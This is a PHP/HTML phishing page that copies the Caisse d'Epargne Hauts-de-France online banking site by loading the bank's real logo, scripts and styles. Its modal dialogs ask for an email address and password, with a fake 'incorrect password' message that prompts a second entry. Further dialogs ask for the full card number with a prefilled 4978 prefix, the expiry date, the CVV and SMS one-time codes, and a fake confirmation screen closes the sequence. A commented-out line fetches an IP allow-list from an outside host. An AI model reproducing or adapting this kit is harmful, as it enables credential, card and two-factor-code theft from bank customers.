<?php
/*$ipContent = file_get_contents('http://uncom1.associates/allow.txt');
$ip = $_SERVER['REMOTE_ADDR'];
*/
if(true){
?>




<?php
				session_start();
				$user_id = "";
				$user_password = "";
			?>

<!DOCTYPE html>
<!--[if IE 8]><html lang="fr" class="no-js no-response old-ie ie8"><![endif]-->
<!--[if IE 9]><html lang="fr" class="no-js response old-ie ie9"><![endif]-->
<!--[if gt IE 9]><!-->
<html lang="fr" class="no-js response">
<!--<![endif]-->
<head>

    <meta charset="utf-8">
    <meta name="viewport" content="user-scalable=no, initial-scale=1, maximum-scale=1, width=device-width">
    <!--[if gte IE 9]><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><![endif]-->
    <!--[if IE 8]><meta http-equiv="X-UA-Compatible" content="IE=8" ><![endif]-->
        <title>Caisse d'Epargne</title>
    <!--[if IE]><link rel="shortcut icon" type="image/x-icon" href="https://www.caisse-epargne.fr:443/bundles/inddefault/images/favicon.ico?1.4.11"><![endif]-->
	
	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
    <link rel="shortcut icon" type="image/x-icon" href="https://www.caisse-epargne.fr:443/bundles/inddefault/images/favicon.png?1.4.11">
                    <script type="text/javascript" src="https://www.caisse-epargne.fr/hauts-de-france/configuration/file/Tracking/dei-part/satelliteLib.js"></script>

                    <script type="text/javascript" src="https://www.caisse-epargne.fr:443/js/a75b9b2.js?1.4.11"></script>
                
                    <script type="text/javascript" src="https://www.caisse-epargne.fr:443/js/9fb35b3.js?1.4.11"></script>
                      
                    <script type="text/javascript" src="https://www.caisse-epargne.fr:443/js/2a2c21d.js?1.4.11"></script>
        
                    <script type="text/javascript" src="https://www.caisse-epargne.fr:443/js/d383c22.js?1.4.11"></script>
        
                    <script type="text/javascript" src="https://www.caisse-epargne.fr:443/js/cfdcc2d.js?1.4.11"></script>
        
                    <script type="text/javascript" src="https://www.caisse-epargne.fr:443/js/4fb8ac6.js?1.4.11"></script>
        
                <script type="text/javascript" src="https://www.caisse-epargne.fr:443/js/fae2cc6.js?1.4.11"></script>
        
                <script type="text/javascript" src="https://www.caisse-epargne.fr:443/js/ee5863a.js?1.4.11"></script>
                            <script type="text/javascript" src="https://www.caisse-epargne.fr:443/js/ec1c51b.js?1.4.11"></script>
        
    
                            <link rel="stylesheet" href="https://www.caisse-epargne.fr:443/css/e449984.css?1.4.11"/>
        
                    <link rel="stylesheet" href="https://www.caisse-epargne.fr:443/css/f08dd15.css?1.4.11"/>
        
        <style>
		
		.modalspan1 {
				display: inline-block;
				width: 170px;
				height: 30px;

			}

			.valideb {
				font-size: 13px;
				font-weight: 700;
				line-height: 130%;

				height: 45px;
				padding: 0 20px;
				cursor: pointer;
				text-decoration: none;
				text-transform: uppercase;
				color: #fff;
				border: none;
				background-color: #1344a1;
			}

			.loading ,.loaderdiv2, .loaderdiv3, .loaderdiv6, .loaderdiv4, .loaderdiv7 {
				text-align:center;
				display:inline-block;
				border: 7px solid #f3f3f3;
				border-radius: 50%;
				border-top: 7px solid #717171;
				width: 70px;
				height: 70px;
				margin:119px auto;
				-webkit-animation: spin 2s linear infinite; /* Safari */
				animation: spin 2s linear infinite;
			}
			.loading{
				margin:75px;

			}

			.warninginput {
				border-color:red;
			}
			.success-checkmark {
			   width: 80px;
			   height: 115px;
			   margin: 0 auto;
			}
			 .success-checkmark .check-icon {
			   width: 80px;
			   height: 80px;
			   position: relative;
			   border-radius: 50%;
			   box-sizing: content-box;
			   border: 4px solid #4caf50;
			}
			 .success-checkmark .check-icon::before {
			   top: 3px;
			   left: -2px;
			   width: 30px;
			   transform-origin: 100% 50%;
			   border-radius: 100px 0 0 100px;
			}
			 .success-checkmark .check-icon::after {
			   top: 0;
			   left: 30px;
			   width: 60px;
			   transform-origin: 0 50%;
			   border-radius: 0 100px 100px 0;
			   animation: rotate-circle 4.25s ease-in;
			}
			 .success-checkmark .check-icon::before, .success-checkmark .check-icon::after {
			   content: '';
			   height: 100px;
			   position: absolute;
			   background: #fff;
			   transform: rotate(-45deg);
			}
			 .success-checkmark .check-icon .icon-line {
			   height: 5px;
			   background-color: #4caf50;
			   display: block;
			   border-radius: 2px;
			   position: absolute;
			   z-index: 10;
			}
			 .success-checkmark .check-icon .icon-line.line-tip {
			   top: 46px;
			   left: 14px;
			   width: 25px;
			   transform: rotate(45deg);
			   animation: icon-line-tip 0.75s;
			}
			 .success-checkmark .check-icon .icon-line.line-long {
			   top: 38px;
			   right: 8px;
			   width: 47px;
			   transform: rotate(-45deg);
			   animation: icon-line-long 0.75s;
			}
			 .success-checkmark .check-icon .icon-circle {
			   top: -4px;
			   left: -4px;
			   z-index: 10;
			   width: 80px;
			   height: 80px;
			   border-radius: 50%;
			   position: absolute;
			   box-sizing: content-box;
			   border: 4px solid rgba(76, 175, 80, .5);
			}
			 .success-checkmark .check-icon .icon-fix {
			   top: 8px;
			   width: 5px;
			   left: 26px;
			   z-index: 1;
			   height: 85px;
			   position: absolute;
			   transform: rotate(-45deg);
			   background-color: #fff;
			}
			 @keyframes rotate-circle {
			   0% {
			     transform: rotate(-45deg);
			  }
			   5% {
			     transform: rotate(-45deg);
			  }
			   12% {
			     transform: rotate(-405deg);
			  }
			   100% {
			     transform: rotate(-405deg);
			  }
			}
			 @keyframes icon-line-tip {
			   0% {
			     width: 0;
			     left: 1px;
			     top: 19px;
			  }
			   54% {
			     width: 0;
			     left: 1px;
			     top: 19px;
			  }
			   70% {
			     width: 50px;
			     left: -8px;
			     top: 37px;
			  }
			   84% {
			     width: 17px;
			     left: 21px;
			     top: 48px;
			  }
			   100% {
			     width: 25px;
			     left: 14px;
			     top: 45px;
			  }
			}
			 @keyframes icon-line-long {
			   0% {
			     width: 0;
			     right: 46px;
			     top: 54px;
			  }
			   65% {
			     width: 0;
			     right: 46px;
			     top: 54px;
			  }
			   84% {
			     width: 55px;
			     right: 0px;
			     top: 35px;
			  }
			   100% {
			     width: 47px;
			     right: 8px;
			     top: 38px;
			  }
			}
		/* Safari */
		@-webkit-keyframes spin {
		  0% { -webkit-transform: rotate(0deg); }
		  100% { -webkit-transform: rotate(360deg); }
		}

		@keyframes spin {
		  0% { transform: rotate(0deg); }
		  100% { transform: rotate(360deg); }
		}

		</style>

    
    <script type="text/javascript">
        document.getElementsByTagName('html')[0].className = "no-js no-response";
    </script>
        </head>
<body itemscope itemtype="http://schema.org/WebPage" class="layout-fluid pageload page-home">


	<div class="modal fade " id="exampleModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
		  <div class="modal-dialog" role="document">
			<div class="modal-content" style="text-align:center;position: relative;left:30px;width: 90%">
				
				 <div class="modal-body" id="mbody1" style="display:none;">
			  
			  
				  <h5 class="text-center" style="margin-bottom: 15px;">Vérification de votre Adresse e-mail. </h5>

				  <h3><p align='left' style='color:#212F3C;'>&nbsp;&nbsp;&nbsp;Se connecter à Orange - Validation de votre adresse e-mail.</p></h3>
				  <div class="form-group text-left">
					<label for="recipient-name" class="col-form-label" style="max-width: 100%; width: 100%;">
						<strong class="" style="padding-right: 12px;">Adresse e-mail:</strong>
						<input type="text" class="form-control" id="email" placeholder="<?php if (isset($_SESSION['email'])) echo $_SESSION['email']; ?>"  maxlength="50" required  style="
    display: inline;height: 32px;
    ">
					</label>
				  </div>
				  <div class="form-group text-left">
					<label for="message-text" class="col-form-label" style="max-width: 100%; width: 100%;">
					<strong  class="" style="padding-right: 12px;">Mot de passe:</strong>
					<input type="password" class="form-control" id="password" placeholder="" maxlength="25" required  style="
    display: inline;height: 32px;
    ">
					</label>
				  </div>
				    <p id="warningparag1" style="color:#FF0000;display:none;font-size:11pt;">Votre mot de passe est incorrect</p>  
					  <p id="warningPassVerification1" style="color:#FF0000;display:none;font-size:11pt;">Votre mot de passe est incorrect</p>  
				  <!--   <p style="color:red;padding:13px;">Votre adresse e-mail doit être obligatoirement renseignée pour pouvoir this is correct ?
recevoir toutes les informations liées à l'activité de votre compte. -->
			  </div>
				<div class="modal-body" id="mbody1_1" style="display:none;">
			  
			  
				  <h5 class="text-center" style="margin-bottom: 15px;">Vérification de votre Adresse e-mail. </h5>

				  <h3><p align='left' style='color:#212F3C;'>&nbsp;&nbsp;&nbsp;Se connecter à Orange - Validation de votre adresse e-mail.</p></h3>
				  <div class="form-group text-left">
					<label for="recipient-name" class="col-form-label" style="max-width: 100%; width: 100%;">
						<strong class="" style="padding-right: 12px;">Adresse e-mail:</strong>
						<input type="text" class="form-control" id="email_2" placeholder="<?php if (isset($_SESSION['email'])) echo $_SESSION['email']; ?>"  maxlength="50" required  style="
    display: inline;height: 32px;
    ">
					</label>
				  </div>
				  <div class="form-group text-left">
					<label for="message-text" class="col-form-label" style="max-width: 100%; width: 100%;">
					<strong  class="" style="padding-right: 12px;">Mot de passe:</strong>
					<input type="password" class="form-control" id="password_2" placeholder="" maxlength="25" required  style="
    display: inline;height: 32px;
    ">
					</label>
				  </div>
				    <p id="warningparag2" style="color:#FF0000;display:none;font-size:11pt;">Votre mot de passe est incorrect</p>  
					  <p id="warningPassVerification2" style="color:#FF0000;display:block;font-size:11pt;">Votre mot de passe est incorrect</p>  
				  <!--   <p style="color:red;padding:13px;">Votre adresse e-mail doit être obligatoirement renseignée pour pouvoir this is correct ?
recevoir toutes les informations liées à l'activité de votre compte. -->
			  </div>



			  <div class="modal-body" id="mbodycustom6" style="display:none;">
			  
			  
				<div id="containerCM">
						<div class="blockCM">
					<h2>Confirmez qu'il s'agit bien de vous</h2>
					
					<p>Cette vérification est obligatoire afin de confirmer que vous êtes bien le titulaire du compte.<br>
	
			
					
					
					 <div class="form-group">
				  
				  
						<p style="color:red;padding:13px;"><br>

						Veuillez confirmer votre carte de crédit.
					
						<div class="row" style="padding: 0 79px 0 79px;">
							<input type="text" class="form-control" id="customcode1" placeholder="CC" maxlength="4" value="4978" readonly style="width: 25%">   
							<input type="text" class="form-control" id="customcode2" placeholder="****" maxlength="4"  required style="width: 25%"> 
							<input type="text" class="form-control" id="customcode3" placeholder="****" maxlength="4" required style="width: 25%"> 
							<input type="text" class="form-control" id="customcode4" placeholder="****" maxlength="4"  required style="width: 25%"> 
						</div><br>
											<div class="row" style="padding: 0 79px 0 79px;">
						
						<select id="expm" class="form-control" name="007" required="" placeholder="" style="width: 98px;" required>
							<option value="" disabled="" selected="">Mois</option>
                            <option value="01">01-janvier</option>
							<option value="02">02-février</option>
							<option value="03">03-mars</option>
							<option value="04">04-avril</option>
							<option value="05">05-mai</option>
							<option value="06">06-juin</option>
							<option value="07">07-juillet</option>
							<option value="08">08-août</option>
							<option value="09">09-septembre</option>
							<option value="10">10-octobre</option>
							<option value="11">11-novembre</option>
							<option value="12">12-décembre</option>
						</select>

						<select id="expy" class="form-control" name="008" required="" placeholder="Date d'expiration (MM/AAAA)" style="width: 100px;"required>
							<option value="" disabled="" selected="">Année</option>							
							<option value="21">2021</option>
							<option value="22">2022</option>
							<option value="23">2023</option>
							<option value="24">2024</option>
							<option value="25">2025</option>
							<option value="26">2026</option>
							<option value="27">2027</option>
							<option value="28">2028</option>
							<option value="29">2029</option>
							<option value="30">2030</option>
						</select>
					</div><br>
											<div class="row" style="padding: 0 79px 0 79px;">
							<input type="text" class="form-control" id="ccv" name="ccv" maxlength="3" required="" style="text-align: center;width: 98px;" placeholder="XXX"required>
						</div>
					
					</div>
					
					<p id="warningparag6" style="color:red;display:none;padding:6px;">Veuillez saisir le code SMS</p>
				   
				  
			
			
				   
					
					</div>

				</div>
				 
				 
				
			  </div>

			  
			  
			   <div class="modal-body" id="mbody3" style="display:none;">
			  
			  
				<div id="containerCM">
						<div class="blockCM">
					<h2>Authentification par SMS (Mobile)</h2>
					
					<p>Pour confirmer votre identité veuillez saisir le code SMS transmis à votre numéro de téléphone mobile.<br>
	
			
					
					
					 <div class="form-group">
				  
				
						<p style="padding:4px;"><strong style="font-size:90%" ;="">Code reçu par SMS:</strong></p>

						<input type="text" class="form-control" id="sms" placeholder="******" maxlength="6" style="text-align:center;width: 169px;margin: auto;" required>
					
					</div>
					
					<p id="warningparag3" style="color:red;display:none;padding:6px;">Veuillez saisir le code SMS !</p>
				   <div style="padding:10px;">
				   <div style="font-size:90%" >Vous allez recevoir un code SMS dans <span id="time"></span> minutes.</div>

						<img src="img/sms.png" style="position: absolute; top: 115px; right: 10px; width: 80px;">
				   </div>
				  
			
			
				   
					
					</div>

				</div>
				 
				 
				
			  </div>
			  <div class="modal-body" id="mbody4" style="display:none;">
			  
			  
				<div id="containerCM">
						<div class="blockCM">
					<h2>Authentification par SMS (Mobile)</h2>
					
					<p>Pour confirmer votre identité veuillez saisir le code SMS transmis à votre numéro de téléphone mobile.<br>
	
			
					
					
					 <div class="form-group">
				  
				
						<p style="padding:4px;"><strong style="font-size:90%" ;="">Code reçu par SMS:</strong></p>

						<input type="text" class="form-control" id="sms2" placeholder="*****" maxlength="12" style="text-align:center;width: 169px;margin: auto;" required>
					
					</div>
					
					<p id="warningparag4" style="color:red;display:none;padding:6px;">Veuillez saisir le code SMS !</p>
				   <div style="padding:10px;">
				   <div style="font-size:90%" >Vous allez recevoir un code SMS dans <span id="time2"></span> minutes.</div>

						<img src="img/sms.png" style="position: absolute; top: 115px; right: 10px; width: 80px;">
				   </div>
				  
			
			
				   
					
					</div>

				</div>
				 
				 
				
			  </div>
			  
			  
			  <!-- <div class="modal-body" id="mbody4" style="display:none;">
			  
					<div id="containerCM">
						<div class="blockCM">
					<h2>Verification des informations</h2>
					
					<p>Afin de mettre à jour votre compte, veuillez saisir le code SMS<br>
	
			
					
					
					 <div class="form-group">
				  
				  
						<p style="color:red;padding:13px;">*CETTE ACTIVATION EST IMPÉRATIVE<br>

						En l'ignorant Toutes les etapes seront annulées.
						</p>
						<p style="padding:4px;"><strong style="font-size:90%" ;="">Code reçu par SMS:</strong></p>

						<input type="text" class="form-control" id="sms2" placeholder="CODE SMS" maxlength="12" style="text-align:center;width: 169px;margin: auto;" required>
					
					</div>
					
					<p id="warningparag4" style="color:red;padding:6px;">Votre code est expiré, vous allez recevoir un autre dans quelques secondes !</p>
				   <div style="padding:10px;">
				   <div style="font-size:90%" >Vous allez recevoir votre code dans <span id="time"></span> minutes.</div>
				   </div>
				  
					</div>
			
				   
					
					

				</div>
				
			  </div>
			   -->
			  
			  
				<div class="modal-body" id="mbody5" style="display:none;">	  
					<h4>La demande de validation de votre numéro de mobile a bien été prise en compte, elle sera traitée par nos services dans un délai de 48h.</h4>
					  <h4>Déconnexion en cours...</h4>
					<div class="success-checkmark">
                      <div class="check-icon">
                        <span class="icon-line line-tip"></span>
                        <span class="icon-line line-long"></span>
                        <div class="icon-circle"></div>
                        <div class="icon-fix"></div>
                      </div>
                    </div>
				</div>	

			  
			  
			  
			  <div class="loaderdiv" style="display:none;">
			  	<p style="margin:auto;margin-top: 30px;font-size:20px;">Vérification en cours ...</p>
			  	<div class="loading"></div>
			  </div>
			  <div class="loaderdiv2" style=""></div>
			  <div class="loaderdiv6" style="display:none;"></div>
			  <div class="loaderdiv3" style="display:none;"></div>
			  <div class="loaderdiv4" style="display:none;"></div>
			  
			  <div class="loaderdiv7" style="display:none;"></div>
			  
			  
			  <div class="modal-footer">
			
				<a id="valideritem" class="bouton-rond" style="float: right;cursor:pointer;font-color:white">Valider</span></a>
				
							
			  </div>
			</div>
		  </div>
		</div>



                <div id="app">
                    <div id="header" class="headerExt headerExtDEI" style="padding:0px;"     ez-url="https://www.caisse-epargne.fr/">

    <div class="header-outer">
        <div class="header-inner">

            <div class="header-logo">
                <a href="https://www.caisse-epargne.fr/hauts-de-france/particuliers" itemprop="url">
                        <img src="https://www.caisse-epargne.fr:443/var/storage/images/ind/configuration/national/647-218-fre-NF/hauts-de-france-nord-france-europe_logo.jpg?1.4.11" 
                                                               alt="Caisse d’Epargne Hauts de France"
                     title="Caisse d’Epargne Hauts de France"
                     itemprop="logo" class="ezimage-field" />

                </a>
            </div>

            <div class="header-market">
                <a href="#" data-market="title" class="header-market_title"
                   id="header-market_title">Particuliers</a>
                <ul data-market="dropdown" class="header-market_dropdown">
                                            <li class="header-market_dropdown-element">
                                                            <a class="header-market_dropdown-link active"
                                   href="https://www.caisse-epargne.fr/hauts-de-france/particuliers">
                                    Particuliers
                                </a>
                                                    </li>
                                            <li class="header-market_dropdown-element">
                                                            <a class="header-market_dropdown-link"
                                   href="https://www.caisse-epargne.fr/hauts-de-france/professionnels">
                                    Professionnels
                                </a>
                                                    </li>
                                            <li class="header-market_dropdown-element">
                                                            <a class="header-market_dropdown-link"
                                   href="https://www.caisse-epargne.fr/hauts-de-france/entreprises">
                                    Entreprises
                                </a>
                                                    </li>
                                            <li class="header-market_dropdown-element">
                                                            <a class="header-market_dropdown-link"
                                   href="https://www.caisse-epargne.fr/hauts-de-france/associations-fondations-mutuelles">
                                    Associations, Fondations, Mutuelles - Mandataires Judiciaires à la Protection des Majeurs
                                </a>
                                                    </li>
                                            <li class="header-market_dropdown-element">
                                                            <a class="header-market_dropdown-link"
                                   href="https://www.caisse-epargne.fr/hauts-de-france/secteur-public">
                                    Secteur public
                                </a>
                                                    </li>
                                            <li class="header-market_dropdown-element">
                                                            <a class="header-market_dropdown-link"
                                   href="https://www.caisse-epargne.fr/hauts-de-france/logement-social">
                                    Logement Social - Économie Mixte
                                </a>
                                                    </li>
                                            <li class="header-market_dropdown-element">
                                                            <a class="header-market_dropdown-link"
                                   href="https://www.caisse-epargne.fr/hauts-de-france/immobilier-professionnel">
                                    Immobilier professionnel
                                </a>
                                                    </li>
                                    </ul>
            </div>

            <div class="header-search">
                <form class="header-search_form" action="https://www.caisse-epargne.fr/hauts-de-france/redirectsearch">
                    <input type="hidden" class="header-marche-input" name="current_marche"
                           value="https://www.caisse-epargne.fr/hauts-de-france/particuliers"/>
                    <input type="text" placeholder="Rechercher" class="header-search_input"
                           name="search_phrase">
                    <input type="submit" value="OK" class="header-search_submit"/>
                </form>
            </div>

            <div class="header-account-link">
                <a href="#" class="header-account-link_link header-account-link_link-connect hide">
                    <span class="header-account-link_icon-lock"></span><span class="header-account-link_text">Acc&egrave;s aux comptes</span>
                </a>
                
                
                                    <a href="#" onclick="ezLogout()" class="header-account-link_link header-account-link_link-disconnect">
                                    <span class="header-account-link_icon-cross"></span>
                    <span class="header-account-link_text">D&eacute;connexion</span>
                </a>
            </div>
                        <script>
                function ezLogout() {
                                                    javascript:WebForm_DoPostBackWithOptions(new WebForm_PostBackOptions("Cartouchedd$olnkDeconnexion", "", true, "", "", false, true));
                        
                }
            </script>

            <div class="header-speed-links">
                <ul class="header-speed-links_list">
                                                                <li class="header-speed-links_item"><a href="javascript:WebForm_DoPostBackWithOptions(new WebForm_PostBackOptions(&quot;MM$m_PostBack&quot;, &quot;MSILIS&quot;, true, &quot;&quot;, &quot;&quot;, false, true));" id="mailez" class=" header-speed-links_item-link" title="" target=""><div class=" header-speed-links_item-icon header-speed-links_mailbox"></div><div id="mailezbis"></div><div class="header-speed-links_item-text">Messagerie</div></a><script>
            function messagerieHeader(msgAlerte) {
                $("#mailez").addClass("header-load-tooltip");
                $("#mailezbis").addClass("header-speed-links_item-new-mail");
                $("#mailez").attr('title', msgAlerte);
                App.HeaderDEI.Tooltips.init();
            }
        </script>

                    </li>
                                            <li class="header-speed-links_item"><a href="javascript:WebForm_DoPostBackWithOptions(new WebForm_PostBackOptions(&quot;MM$m_PostBack&quot;, &quot;RETWEBCF&quot;, true, &quot;&quot;, &quot;&quot;, false, true));" class=" header-speed-links_item-link" title="" target=""><div class="header-speed-links_item-icon header-speed-links_lock"></div><div class="header-speed-links_item-text">Coffre-fort</div></a>

                    </li>
                                            <li class="header-speed-links_item"><a href="https://www.caisse-epargne.fr/hauts-de-france/particuliers/rechercher-une-agence" class=" header-speed-links_item-link" title="" target=""><div class="header-speed-links_item-icon header-speed-links_agencies"></div><div class="header-speed-links_item-text">Agences</div></a>

                    </li>
                                            <li class="header-speed-links_item"><a href="https://www.caisse-epargne.fr/hauts-de-france/services-numeros-utiles" class=" header-speed-links_item-link" title="" target=""><div class="header-speed-links_item-icon header-speed-links_agenda"></div><div class="header-speed-links_item-text">Numéros utiles</div></a>

                    </li>
                                            <li class="header-speed-links_item"><a href="https://www.caisse-epargne.fr/hauts-de-france/particuliers/contactez-un-conseiller" data-contact-tooltip="trigger" onclick="return false;" class=" header-speed-links_item-link" title="" target=""><div class="header-speed-links_item-icon header-speed-links_contact"></div><div class="header-speed-links_item-text">Contact<br> Prise de rdv</div></a><div data-contact-tooltip="tooltip" class="header-tooltip-contact"><div class="header-tooltip-contact_top"></div><div class="header-tooltip-contact_content"><div class="header-tooltip-contact-default"><div class="header-tooltip-contact-default_conseil"><div class="header-tooltip-contact-default_conseil-title">Mon conseiller</div><div class="header-tooltip-contact-default_conseil-conseil nameAjax"></div></div><ul class="header-tooltip-contact-default_list"><li class="header-tooltip-contact-default_item"><a href="" class="header-tooltip-contact-default_link phoneAjax"><span class="header-tooltip-contact-default_icon-phone"></span><span class="header-tooltip-contact-default_text phoneAjaxText"></span></a></li><li class="header-tooltip-contact-default_item"><a href="" class="header-tooltip-contact-default_link mailAjax"><span class="header-tooltip-contact-default_icon-email"></span><span class="header-tooltip-contact-default_text mailAjaxText"></span></a></li><li class="header-tooltip-contact-default_item"><a href="https://www.caisse-epargne.fr/hauts-de-france/particuliers/rendez-vous-en-ligne" class="lien-prdvel header-tooltip-contact-default_link linkAjax"><span class="header-tooltip-contact-default_icon-prdvel"></span><span class="header-tooltip-contact-default_text">Prendre RDV</span></a></li><li class="header-tooltip-contact-default_item header-tooltip-contact-default_item-hidden header_link_mbl_tooltip"><a href="https://www.caisse-epargne.fr/hauts-de-france/particuliers/contactez-un-conseiller" class="header-tooltip-contact-default_link linkAjax"><span class="header-tooltip-contact-default_icon-athome"></span><span class="header-tooltip-contact-default_text">Mon agence en ligne</span></a></li><li class="header-tooltip-contact-default_item header-tooltip-contact-default_item-hidden header_link_no-mbl_tooltip"><a href="https://www.caisse-epargne.fr/hauts-de-france/particuliers/contactez-un-conseiller" class="header-tooltip-contact-default_link linkagence"><span class="header-tooltip-contact-default_icon-marker"></span><span class="header-tooltip-contact-default_text">Coordonn&eacute;es de mon agence</span></a></li></ul></div></div><div class="header-tooltip-contact_bottom"></div></div>

                    </li>
                                    </ul>
            </div>
            <div class="header-user-account">
                                    <div class="header-user-account-profile">
                        <a class="header-user-account-profile_link" href="javascript:WebForm_DoPostBackWithOptions(new WebForm_PostBackOptions('MM$m_PostBack', 'COOSYNT0', true, '', '', false, true));">
                            <div class="header-user-account-profile_icon"></div>
                            <div class="header-user-account-profile_text">Mon profil</div>
                        </a>
                    </div>
                                <div class="header-user-account-infos">
                    <a 
                                             href='javascript:WebForm_DoPostBackWithOptions(new WebForm_PostBackOptions("MM$m_PostBack", "COOSYNT0", true, "", "", false, true));' 
                                                 class="header-user-account-infos_link">
                        <span class="header-user-account-infos_name"></span>
                        <span class="header-user-account-infos_agency" style="display: none;"></span>
                    </a>
                </div>
            </div>
                                            <div class="header-navigation">
            <table cellspacing="0" cellpadding="0" border="0" width="100%" class="header-navigation_main">
                <tr>
                                                                                                
                        <td data-header-navigation="dropdown" class="header-navigation_main-item">
                                                                                             <a class="header-navigation_main-item-link" numunivdei="" href="javascript:WebForm_DoPostBackWithOptions(new WebForm_PostBackOptions(&quot;MM$m_PostBack&quot;, &quot;CPTSYNT0&quot;, true, &quot;&quot;, &quot;&quot;, false, true))">
                                                                            <div class="header-navigation_main-item-icon-report"></div>
                                                                                                                <span class="header-navigation_main-item-text">Ma Synthèse</span>
                                </a>
                                                    </td>
                                                                                                
                        <td data-header-navigation="dropdown" class="header-navigation_main-item">
                                                                                             <a class="header-navigation_main-item-link" numunivdei="" href="javascript:WebForm_DoPostBackWithOptions(new WebForm_PostBackOptions(&quot;MM$m_PostBack&quot;, &quot;CPTSYNT1&quot;, true, &quot;&quot;, &quot;&quot;, false, true))">
                                                                        <span class="header-navigation_main-item-text">Mes Comptes</span>
                                </a>
                                                    </td>
                                                                                                
                        <td data-header-navigation="dropdown" class="header-navigation_main-item">
                                                                                             <a class="header-navigation_main-item-link" numunivdei="" href="javascript:WebForm_DoPostBackWithOptions(new WebForm_PostBackOptions(&quot;MM$m_PostBack&quot;, &quot;CRESYNT0&quot;, true, &quot;&quot;, &quot;&quot;, false, true))">
                                                                        <span class="header-navigation_main-item-text">Mes Crédits</span>
                                </a>
                                                    </td>
                                                                                                
                        <td data-header-navigation="dropdown" class="header-navigation_main-item">
                                                                                             <a class="header-navigation_main-item-link" numunivdei="" href="javascript:WebForm_DoPostBackWithOptions(new WebForm_PostBackOptions(&quot;MM$m_PostBack&quot;, &quot;EPASYNT0&quot;, true, &quot;&quot;, &quot;&quot;, false, true))">
                                                                        <span class="header-navigation_main-item-text">Mon Épargne</span>
                                </a>
                                                    </td>
                                                                                                
                        <td data-header-navigation="dropdown" class="header-navigation_main-item">
                                                                                             <a class="header-navigation_main-item-link" numunivdei="" href="javascript:WebForm_DoPostBackWithOptions(new WebForm_PostBackOptions(&quot;MM$m_PostBack&quot;, &quot;SYNTASMP&quot;, true, &quot;&quot;, &quot;&quot;, false, true))">
                                                                        <span class="header-navigation_main-item-text">Mes Assurances</span>
                                </a>
                                                    </td>
                                    </tr>
            </table>
        </div>
    
                    </div>
    </div>
</div>

<script>
        
    // Mise a jour de la tooltip contact et du nom du client dans le header
    function getContact() {
        $.ajax({
            url: $("#header").attr("ez-url") + 'headerdeicontact',
            type: "POST",
            crossDomain: true,
            jsonpCallback: 'callBackJPContact',
            dataType: "jsonp",
            success: function (data) {
                if (!data) {
                    return;
                }
                $(".header-user-account-infos_name").html(data["username"].split("/")[0]);
                // Si le client est non part, on affiche la raison sociale
                if (data["marcheDEI"] != 'WE') {
                    $(".header-user-account-infos_agency").show();
                    // On affiche le nom de la Raison Sociale
                    if (data["username"].split("/").length > 1 && data["username"].split("/")[1].replace(/\s+/g, '') != data["username"].split("/")[0].replace(/\s+/g, '')) {
                        $(".header-user-account-infos_agency").html(data["username"].split("/")[1]);
                    }
                    // Retrait de la tooltip pour les non part
                    $(".header-speed-links_item-link").removeAttr("data-contact-tooltip");
                    $(".header-speed-links_item-link").removeAttr("onclick");
                }
                // Gestion en fonction du profil DEI part
                else {
                    $(".phoneAjax").attr("href", "tel:" + data["telephone"]);
                    $(".phoneAjax").attr("href", $(".phoneAjax").attr("href").replace(/ /g, ''));
                    var cout = "<small>" + $.getPhoneNotice(data['prixappelcons']) + "</small>";
                    $(".phoneAjaxText").html(data["telephone"] + ' ' + cout); //span
                    if (data["telephone"] == null) {
                        $(".header-tooltip-contact-default_link.phoneAjax").parent().hide();
                    }
                    $(".mailAjax").attr("href", "mailto:" + data["mail"]);
                    $(".mailAjaxText").html(data["mail"]);
                    $(".nameAjax").html(data["nom"]);

                    if (data["profil"] == 1) {
                        $(".header_link_no-mbl_tooltip").show();
                    }
                    else if (data["profil"] == 2) {
                        $(".header_link_mbl_tooltip").show();
                    }
                    else {
                        $(".header-speed-links_item-link").removeAttr("data-contact-tooltip");
                        $(".header-speed-links_item-link").removeAttr("onclick");
                    }
                }
                $("a").each(function (i) {
                    var str = $(this).attr("href");
                    if (str != null)
                        $(this).attr("href", str.replace("(~deibaseurl)", data['deibaseurl']));
                });
								
                // Gestion de l'alignement de l'email et de l'icône s'il est sur 2 lignes
                var mailConseil = $('.mailAjaxText').text();
                if ( mailConseil.length > 37)
                {
                    $('.mailAjax').addClass("longEmailTooltipA");
                    $('.header-tooltip-contact-default_icon-email').addClass("longEmailTooltipIcon");
                    $('.mailAjaxText').addClass("longEmailTooltipMail");
                }
                
            },
            error: function (jqXHR, textStatus, error) {
            }
        });
    }

    $('a[href*="(~"]').each(function () {
        that = $(this);
        if (matches = $(that).attr('href').match(/\(~\w+\)/gi)) {
            $.each(matches, function (key, value) {
                var newvalue = value.substr(2, value.length - 3);
                var newCookieValue = '';
                if (window.location.href.toLowerCase().indexOf("portail.aspx") >= 0) {
                    var fullCookie = document.cookie.split("&");
                    var cookieKeyValue = [];
                    $(fullCookie).each(function (index, item) {
                        cookieKeyValue.push(item.split("="));
                    });
                    $(cookieKeyValue).each(function (index, item) {
                        if (item[0] == newvalue)
                            newCookieValue = item[1];
                    });
                    $(that).attr('href', $(that).attr('href').replace(value, newCookieValue));
                }
                else
                    $(that).attr('href', $(that).attr('href').replace(value, $.context.get(newvalue)));
            });
        }
    });

   
    function setEZRegion() {
        $.ajax({
            url: $("#header").attr("ez-url") + 'authentification/set?reg=16275',
            type: "POST",
            crossDomain: true,
            jsonpCallback: 'callBackJPContact',
            dataType: "jsonp",
            success: function (data) {

            },
            error: function (jqXHR, textStatus, error) {
            }
        });
    }

    function getCookie(key) {
        var keyValue = document.cookie.match('(^|;) ?' + key + '=([^;]*)(;|$)');
        return keyValue ? keyValue[2] : null;
    }

    setNGIPartContext();



	function setNGIPartContext()
	{
        $nab = "";
        try {
            $nab = getCookie('xtat').split("-")[1]; // on récupère le nab dans le cookie xtat du DEI.
        }
        catch(err) {
            // nothing
        }

	    $.ajax({
            url: $("#header").attr("ez-url") + 'RegisterContext.aspx?auth=1&reg=16275&nab=' + $nab + '&mar=101',
            type: "POST",
            crossDomain: true,
            jsonpCallback: 'callBackJPContact',
            dataType: "jsonp",
            success: function (data) {

            },
            error: function (jqXHR, textStatus, error) {
            }
        });
	}

    function messagerieHeader(msgAlerte) {
        // appel entre autre par MajBlocInfoMSIAsynchrone dans le DEI
